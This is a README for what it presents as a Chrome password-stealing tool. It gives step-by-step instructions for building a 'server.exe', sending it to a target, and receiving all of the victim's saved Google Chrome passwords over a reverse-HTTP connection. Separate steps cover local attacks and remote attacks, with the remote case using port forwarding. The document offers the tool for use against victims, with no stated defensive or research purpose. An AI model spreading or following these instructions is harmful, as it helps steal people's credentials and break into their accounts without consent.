# Hacking Chrome Saves Passwords

Features:

1. Client (that receives remote connection from victim)
2. Server (to send the victim.

Victim will open the server and all the Google Chrome Passwords will be sent to the attacker remotely an saved as a text file on the attacker's computer. The connection is done by reverse-http.


# Instructions:

Step 1.
Install pyton 2.7
(useful): py2exe

## Local Exploitation (If your target is in the same network as you):

	1. Create server by runing the python script "create_server.py". It will then ask you for your ip, you must type your local ip (ex: 192.168.0.1)
	2. Start the client by runing the python script "client.py". It will ask you again for your local ip.
	3. Send the server.exe to your target.
	4. Obtain a password text file in the same location as the client with all the Google Chrome Passwords.

## Remote Exploitation (If target is NOT on the same network as you):

	1. Create server by runing the python script "create_server.py". It will then ask you for your ip, you must type your PUBLIC ip (ex: 152.162.93.12). You can obtain your public ip by typing "WhatIsMyIp" on Google.
	2. Setup Port forwading. You want to forward the port 80 and 8080 to your machine (look up how to do that if you don't know)
	3. Start the client and stype your LOCAL (never public here) IP.
	4. Send the server.exe to your target.
	5. Obtain a password text file in the same location as the client with all the Google Chrome Passwords.


# NOTE:
	DO NOT change the name of the python scripts.
	

# Any questions contact me at: admin@ItCrashSecurity.com
